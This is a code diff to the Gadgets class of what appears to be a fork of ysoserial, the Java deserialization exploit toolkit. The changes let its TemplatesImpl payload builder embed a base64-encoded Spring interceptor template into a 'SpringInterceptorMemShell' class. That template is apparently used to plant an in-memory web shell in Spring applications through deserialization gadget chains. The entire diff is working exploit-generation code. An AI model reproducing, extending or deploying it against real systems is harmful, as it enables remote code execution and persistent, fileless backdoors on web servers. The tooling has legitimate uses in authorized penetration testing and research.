@@ -12,6 +12,8 @@ import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.wicket.util.file.Files;
+import sun.misc.BASE64Encoder;
+import ysoserial.payloads.templates.SpringInterceptorTemplate;
 
 import java.io.File;
 import java.io.Serializable;
@@ -65,6 +67,7 @@ public class Gadgets {
     }
 
     public static Object createTemplatesImpl(String command) throws Exception {
+        command = command.trim();
         Class tplClass;
         Class abstTranslet;
         Class transFactory;
@@ -80,7 +83,8 @@ public class Gadgets {
         }
 
         if (command.startsWith("CLASS:")) {
-            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6));
+            // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
+            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Gadgets.class.getClassLoader());
             return createTemplatesImpl(clazz, null, null, tplClass, abstTranslet, transFactory);
         } else if (command.startsWith("FILE:")) {
             byte[] bs = Files.readBytes(new File(command.substring(5)));
@@ -96,20 +100,29 @@ public class Gadgets {
         final T templates = tplClass.newInstance();
         byte[] classBytes = new byte[0];
         ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        CtClass superC = pool.get(abstTranslet.getName());
         CtClass ctClass;
         if (command != null) {
             ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
-            pool.insertClassPath(new ClassClassPath(abstTranslet));
             ctClass.setName(ctClass.getName() + System.nanoTime());
             String cmd = "cmd = \"" + command + "\";";
             ctClass.makeClassInitializer().insertBefore(cmd);
-            CtClass superC = pool.get(abstTranslet.getName());
             ctClass.setSuperclass(superC);
             classBytes = ctClass.toBytecode();
         }
         if (myClass != null) {
             // CLASS:
-            classBytes = ClassFiles.classAsBytes(myClass);
+            if (myClass.getName().equals("ysoserial.payloads.templates.SpringInterceptorMemShell")) {
+                ctClass = pool.get(myClass.getName());
+                String encode = BASE64Encoder.class.newInstance().encode(ClassFiles.classAsBytes(SpringInterceptorTemplate.class)).replaceAll("\n", "");
+                String content = "b64=\"" + encode + "\";";
+                ctClass.makeClassInitializer().insertBefore(content);
+                ctClass.setSuperclass(superC);
+                classBytes = ctClass.toBytecode();
+            } else {
+                classBytes = ClassFiles.classAsBytes(myClass);
+            }
         }
         if (bytes != null) {
             // FILE:
@@ -123,7 +136,6 @@ public class Gadgets {
             String content = "bs = new byte[]{" + sb + "};";
             // System.out.println(content);
             ctClass.makeClassInitializer().insertBefore(content);
-            CtClass superC = pool.get(abstTranslet.getName());
             ctClass.setSuperclass(superC);
             classBytes = ctClass.toBytecode();
         }
